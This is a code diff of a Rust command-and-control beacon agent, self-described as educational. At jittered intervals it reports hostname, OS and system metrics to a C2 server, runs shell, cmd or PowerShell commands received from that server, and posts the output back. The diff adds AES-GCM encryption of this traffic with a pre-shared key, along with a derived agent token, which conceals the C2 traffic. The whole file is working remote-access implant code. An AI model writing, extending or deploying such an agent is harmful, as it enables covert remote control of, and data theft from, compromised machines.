@@ -1,13 +1,17 @@
 use reqwest::Client;
-use serde_json::{json, Value};
+use serde::{Deserialize, Serialize};
+use serde_json::json;
 use uuid::Uuid;
 use std::fs;
 use std::time::Duration;
 use tokio::time::sleep;
 use rand::Rng;
 use std::process::Command;
+use sysinfo::System;
 
 mod system_info;
+mod auth;
+mod crypto;
 
 #[derive(Serialize)]
 struct BeaconPayload {
@@ -15,6 +19,19 @@ struct BeaconPayload {
     status: String,
     hostname: String,
     os: String,
+    cpu_usage: f64,
+    memory_usage: f64,
+    disk_usage: f64,
+}
+
+#[derive(Serialize)]
+struct EncryptedEnvelope {
+    payload: String,
+}
+
+#[derive(Deserialize)]
+struct EncryptedResponse {
+    payload: String,
 }
 
 #[derive(Deserialize)]
@@ -35,7 +52,6 @@ struct PendingCommand {
 async fn main() {
     println!("Educational HTTPS Beacon Agent starting...");
 
-    // Get or create persistent Agent ID
     let agent_id = get_or_create_agent_id();
     println!("Agent ID: {}", agent_id);
 
@@ -43,68 +59,99 @@ async fn main() {
     let os = system_info::get_os_name();
     println!("Host: {}, OS: {}", hostname, os);
 
-    // Get server URL from env or default
     let server_url = std::env::var("C2_SERVER_URL")
         .unwrap_or_else(|_| "http://localhost:3000".to_string());
-    
-    // Get auth token (in production, load from secure storage or config)
-    let auth_token = std::env::var("C2_AGENT_TOKEN")
-        .unwrap_or_else(|_| "default-token-change-me".to_string());
+
+    let auth_token = auth::compute_agent_token(&agent_id);
+    let psk = auth::get_psk();
 
     println!("Beacon server: {}", server_url);
-    println!("Starting beacon loop with 20-60s jitter...");
+    println!("Starting beacon loop with 20-60s jitter (AES-GCM encrypted)...");
 
     let client = Client::builder()
         .timeout(Duration::from_secs(30))
         .build()
         .expect("Failed to create HTTP client");
 
+    let mut sys = System::new_all();
+
     loop {
-        // Calculate jitter: random sleep between 20-60 seconds
         let jitter = rand::thread_rng().gen_range(20..=60);
-        
-        // Prepare beacon payload
+
+        let metrics = system_info::get_system_metrics(&mut sys);
         let payload = BeaconPayload {
             id: agent_id.clone(),
             status: "alive".to_string(),
             hostname: hostname.clone(),
             os: os.clone(),
+            cpu_usage: metrics.cpu_usage,
+            memory_usage: metrics.memory_usage,
+            disk_usage: metrics.disk_usage,
         };
 
-        // Send beacon
+        let payload_bytes = serde_json::to_vec(&payload).expect("serialize beacon");
+        let encrypted = match crypto::encrypt(&payload_bytes, &psk) {
+            Ok(e) => e,
+            Err(e) => {
+                eprintln!("Encryption failed: {}", e);
+                sleep(Duration::from_secs(jitter)).await;
+                continue;
+            }
+        };
+
         let beacon_url = format!("{}/api/beacon", server_url);
         match client
             .post(&beacon_url)
             .header("Authorization", format!("Bearer {}", auth_token))
-            .json(&payload)
+            .json(&EncryptedEnvelope { payload: encrypted })
             .send()
             .await
         {
             Ok(response) => {
                 if response.status().is_success() {
-                    match response.json::<BeaconResponse>().await {
-                        Ok(beacon_resp) => {
-                            if beacon_resp.success {
-                                println!("Beacon accepted at {}", beacon_resp.timestamp);
-                                
-                                // Process any commands received
-                                for cmd in beacon_resp.commands {
-                                    println!("Received command {}: {}", cmd.id, cmd.command_type);
-                                    execute_command(&client, &server_url, &agent_id, &auth_token, cmd).await;
+                    match response.json::<EncryptedResponse>().await {
+                        Ok(envelope) => {
+                            match crypto::decrypt(&envelope.payload, &psk) {
+                                Ok(plaintext) => {
+                                    match serde_json::from_slice::<BeaconResponse>(&plaintext) {
+                                        Ok(beacon_resp) => {
+                                            if beacon_resp.success {
+                                                println!(
+                                                    "Beacon accepted at {} (cpu {:.1}%, mem {:.1}%)",
+                                                    beacon_resp.timestamp,
+                                                    metrics.cpu_usage,
+                                                    metrics.memory_usage
+                                                );
+                                                for cmd in beacon_resp.commands {
+                                                    println!(
+                                                        "Received command {}: {}",
+                                                        cmd.id, cmd.command_type
+                                                    );
+                                                    execute_command(
+                                                        &client,
+                                                        &server_url,
+                                                        &agent_id,
+                                                        &auth_token,
+                                                        &psk,
+                                                        cmd,
+                                                    )
+                                                    .await;
+                                                }
+                                            }
+                                        }
+                                        Err(e) => eprintln!("Failed to parse beacon response: {}", e),
+                                    }
                                 }
+                                Err(e) => eprintln!("Failed to decrypt response: {}", e),
                             }
                         }
-                        Err(e) => {
-                            eprintln!("Failed to parse beacon response: {}", e);
-                        }
+                        Err(e) => eprintln!("Failed to read response envelope: {}", e),
                     }
                 } else {
                     eprintln!("Beacon rejected: HTTP {}", response.status());
                 }
             }
-            Err(e) => {
-                eprintln!("Beacon failed: {}", e);
-            }
+            Err(e) => eprintln!("Beacon failed: {}", e),
         }
 
         println!("Sleeping for {} seconds before next beacon...", jitter);
@@ -113,25 +160,28 @@ async fn main() {
 }
 
 async fn execute_command(
-    client: &Client, 
-    server_url: &str, 
+    client: &Client,
+    server_url: &str,
     agent_id: &str,
     auth_token: &str,
+    psk: &str,
     cmd: PendingCommand,
 ) {
     println!("Executing command {}: {}", cmd.id, cmd.payload);
-    
+
     let output = match cmd.command_type.as_str() {
         "shell" | "bash" | "cmd" => execute_shell(&cmd.payload),
         "powershell" => execute_powershell(&cmd.payload),
         _ => format!("Unknown command type: {}", cmd.command_type),
     };
 
-    println!("Command {} output (first 100 chars): {}", cmd.id, 
-             if output.len() > 100 { &output[..100] } else { &output });
+    let preview = if output.len() > 100 {
+        &output[..100]
+    } else {
+        &output
+    };
+    println!("Command {} output (first 100 chars): {}", cmd.id, preview);
 
-    // Send result back to server
-    let result_url = format!("{}/api/result", server_url);
     let result_payload = json!({
         "agent_id": agent_id,
         "command_id": cmd.id,
@@ -139,10 +189,20 @@ async fn execute_command(
         "status": "completed"
     });
 
+    let payload_bytes = serde_json::to_vec(&result_payload).expect("serialize result");
+    let encrypted = match crypto::encrypt(&payload_bytes, psk) {
+        Ok(e) => e,
+        Err(e) => {
+            eprintln!("Failed to encrypt result: {}", e);
+            return;
+        }
+    };
+
+    let result_url = format!("{}/api/result", server_url);
     match client
         .post(&result_url)
         .header("Authorization", format!("Bearer {}", auth_token))
-        .json(&result_payload)
+        .json(&EncryptedEnvelope { payload: encrypted })
         .send()
         .await
     {
@@ -153,21 +213,15 @@ async fn execute_command(
                 eprintln!("Failed to send result: HTTP {}", resp.status());
             }
         }
-        Err(e) => {
-            eprintln!("Failed to send result: {}", e);
-        }
+        Err(e) => eprintln!("Failed to send result: {}", e),
     }
 }
 
 fn execute_shell(command: &str) -> String {
     let output = if cfg!(target_os = "windows") {
-        Command::new("cmd")
-            .args(&["/C", command])
-            .output()
+        Command::new("cmd").args(["/C", command]).output()
     } else {
-        Command::new("sh")
-            .args(&["-c", command])
-            .output()
+        Command::new("sh").args(["-c", command]).output()
     };
 
     match output {
@@ -175,7 +229,10 @@ fn execute_shell(command: &str) -> String {
             let stdout = String::from_utf8_lossy(&out.stdout);
             let stderr = String::from_utf8_lossy(&out.stderr);
             let exit_code = out.status.code().unwrap_or(-1);
-            format!("Exit code: {}\n\nSTDOUT:\n{}\n\nSTDERR:\n{}", exit_code, stdout, stderr)
+            format!(
+                "Exit code: {}\n\nSTDOUT:\n{}\n\nSTDERR:\n{}",
+                exit_code, stdout, stderr
+            )
         }
         Err(e) => format!("Failed to execute command: {}", e),
     }
@@ -183,9 +240,9 @@ fn execute_shell(command: &str) -> String {
 
 fn execute_powershell(command: &str) -> String {
     let output = Command::new("powershell")
-        .args(&["-Command", command])
+        .args(["-Command", command])
         .output();
-    
+
     match output {
         Ok(out) => {
             let stdout = String::from_utf8_lossy(&out.stdout);
